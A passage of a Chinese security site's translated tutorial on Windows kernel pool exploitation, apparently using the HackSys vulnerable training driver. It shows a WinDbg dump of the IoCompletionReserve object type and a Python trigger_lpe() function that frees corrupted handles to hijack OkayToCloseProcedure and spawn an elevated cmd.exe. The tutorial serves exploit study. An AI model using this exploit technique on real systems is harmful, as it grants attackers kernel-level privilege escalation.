+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x004&nbsp;Blink&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x84fc8040&nbsp;_LIST_ENTRY&nbsp;[&nbsp;0x84fc8040&nbsp;-&nbsp;0x84fc8040&nbsp;]
+&nbsp;&nbsp;&nbsp;+0x008&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;&quot;IoCompletionReserve&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x000&nbsp;Length&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x26
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x002&nbsp;MaximumLength&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x28
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x004&nbsp;Buffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x88c01090&nbsp;&nbsp;&quot;IoCompletionReserve&quot;
+&nbsp;&nbsp;&nbsp;+0x010&nbsp;DefaultObject&nbsp;&nbsp;&nbsp;&nbsp;:
+&nbsp;&nbsp;&nbsp;+0x014&nbsp;Index&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x0&nbsp;&#39;&#39;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;---&nbsp;TypeIndex&nbsp;is&nbsp;0x0
+&nbsp;&nbsp;&nbsp;+0x018&nbsp;TotalNumberOfObjects&nbsp;:&nbsp;0x61a9
+&nbsp;&nbsp;&nbsp;+0x01c&nbsp;TotalNumberOfHandles&nbsp;:&nbsp;0x61a9
+&nbsp;&nbsp;&nbsp;+0x020&nbsp;HighWaterNumberOfObjects&nbsp;:&nbsp;0x61a9
+&nbsp;&nbsp;&nbsp;+0x024&nbsp;HighWaterNumberOfHandles&nbsp;:&nbsp;0x61a9
+&nbsp;&nbsp;&nbsp;+0x028&nbsp;TypeInfo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;--&nbsp;TypeInfo&nbsp;is&nbsp;offset&nbsp;0x28&nbsp;from&nbsp;0x0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x000&nbsp;Length&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x50
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x002&nbsp;ObjectTypeFlags&nbsp;&nbsp;:&nbsp;0x2&nbsp;&#39;&#39;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x002&nbsp;CaseInsensitive&nbsp;&nbsp;:&nbsp;0y0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x002&nbsp;UnnamedObjectsOnly&nbsp;:&nbsp;0y1
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x002&nbsp;UseDefaultObject&nbsp;:&nbsp;0y0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x002&nbsp;SecurityRequired&nbsp;:&nbsp;0y0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x002&nbsp;MaintainHandleCount&nbsp;:&nbsp;0y0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x002&nbsp;MaintainTypeList&nbsp;:&nbsp;0y0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x002&nbsp;SupportsObjectCallbacks&nbsp;:&nbsp;0y0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x002&nbsp;CacheAligned&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0y0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x004&nbsp;ObjectTypeCode&nbsp;&nbsp;&nbsp;:&nbsp;0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x008&nbsp;InvalidAttributes&nbsp;:&nbsp;0xb0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x00c&nbsp;GenericMapping&nbsp;&nbsp;&nbsp;:&nbsp;_GENERIC_MAPPING
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x01c&nbsp;ValidAccessMask&nbsp;&nbsp;:&nbsp;0xf0003
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x020&nbsp;RetainAccess&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x024&nbsp;PoolType&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0&nbsp;(&nbsp;NonPagedPool&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x028&nbsp;DefaultPagedPoolCharge&nbsp;:&nbsp;0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x02c&nbsp;DefaultNonPagedPoolCharge&nbsp;:&nbsp;0x5c
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x030&nbsp;DumpProcedure&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;(null)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x034&nbsp;OpenProcedure&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;(null)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x038&nbsp;CloseProcedure&nbsp;&nbsp;&nbsp;:&nbsp;(null)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x03c&nbsp;DeleteProcedure&nbsp;&nbsp;:&nbsp;(null)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x040&nbsp;ParseProcedure&nbsp;&nbsp;&nbsp;:&nbsp;(null)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x044&nbsp;SecurityProcedure&nbsp;:&nbsp;0x82cb02ac&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;long&nbsp;&nbsp;nt!SeDefaultObjectMethod+0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x048&nbsp;QueryNameProcedure&nbsp;:&nbsp;(null)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x04c&nbsp;OkayToCloseProcedure&nbsp;:&nbsp;(null)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;---&nbsp;OkayToCloseProcedure&nbsp;is&nbsp;offset&nbsp;0x4c&nbsp;from&nbsp;0x0
+&nbsp;&nbsp;&nbsp;+0x078&nbsp;TypeLock&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x000&nbsp;Locked&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0y0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x000&nbsp;Waiting&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0y0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x000&nbsp;Waking&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0y0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x000&nbsp;MultipleShared&nbsp;&nbsp;&nbsp;:&nbsp;0y0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x000&nbsp;Shared&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0y0000000000000000000000000000&nbsp;(0)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x000&nbsp;Value&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x000&nbsp;Ptr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;(null)
+&nbsp;&nbsp;&nbsp;+0x07c&nbsp;Key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x6f436f49
+&nbsp;&nbsp;&nbsp;+0x080&nbsp;CallbackList&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;[&nbsp;0x84fc80c0&nbsp;-&nbsp;0x84fc80c0&nbsp;]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x000&nbsp;Flink&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x84fc80c0&nbsp;_LIST_ENTRY&nbsp;[&nbsp;0x84fc80c0&nbsp;-&nbsp;0x84fc80c0&nbsp;]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x004&nbsp;Blink&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x84fc80c0&nbsp;_LIST_ENTRY&nbsp;[&nbsp;0x84fc80c0&nbsp;-&nbsp;0x84fc80c0&nbsp;]</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这样，0x28 + 0x4c = 0x74便是我们的指针需要指向的位置。但是<strong>OkayToCloseProcedure</strong>是如何调用的呢？经过研究发现，这是一个注册的aexit handler。所以，为了触发代码的执行，我们只需要释放损坏的IoCompletionReserve。我们并不清楚句柄是与哪一个溢出块相关联，所以我们干脆全部释放它们。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:python;toolbar:false">def&nbsp;trigger_lpe():
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;This&nbsp;function&nbsp;frees&nbsp;the&nbsp;IoCompletionReserve&nbsp;objects&nbsp;and&nbsp;this&nbsp;triggers&nbsp;the
+&nbsp;&nbsp;&nbsp;&nbsp;registered&nbsp;aexit,&nbsp;which&nbsp;is&nbsp;our&nbsp;controlled&nbsp;pointer&nbsp;to&nbsp;OkayToCloseProcedure.
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;free&nbsp;the&nbsp;corrupted&nbsp;chunk&nbsp;to&nbsp;trigger&nbsp;OkayToCloseProcedure
+&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;k,&nbsp;v&nbsp;in&nbsp;khandlesd.iteritems():
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kernel32.CloseHandle(v)
+&nbsp;&nbsp;&nbsp;&nbsp;os.system(&quot;cmd.exe&quot;)</pre><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">最后，我们最终成功实现，如图所示：</span></p><p style="text-indent: 0em; white-space: normal; text-align: center;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p1.qhimg.com/t0153a9cf9002a8449f.png" title="t01149ab5137172bc39.png" alt="http://p3.qhimg.com/t01149ab5137172bc39.png"/></span></p><p style="white-space: normal;"><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">参考文章</span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver</a>&nbsp;</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="http://www.fuzzysecurity.com/tutorials/expDev/20.html">http://www.fuzzysecurity.com/tutorials/expDev/20.html</a>&nbsp;</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-Slides.pdf">https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-Slides.pdf</a>&nbsp;</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms724485(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/ms724485(v=vs.85).aspx</a>&nbsp;</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://www.exploit-db.com/exploits/34272">https://www.exploit-db.com/exploits/34272</a>&nbsp;</span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="http://srcincite.io/blog/2017/09/06/sharks-in-the-pool-mixed-object-exploitation-in-the-windows-kernel-pool.html" target="_blank">原文链接：http://srcincite.io/blog/2017/09/06/sharks-in-the-pool-mixed-object-exploitation-in-the-windows-kernel-pool.html</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】池中之鲨：Windows内核池混合对象利用 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="4434" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="64d932c9bb50dc5a83db601d9b02e735">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment-none alarm-info bg-primary">无任何评论</div>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+                                <li><a href="/learning/detail/4424.html" alt="【知识】9月16日 - 每日安全知识热点" target="_blank">【知识】9月16日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
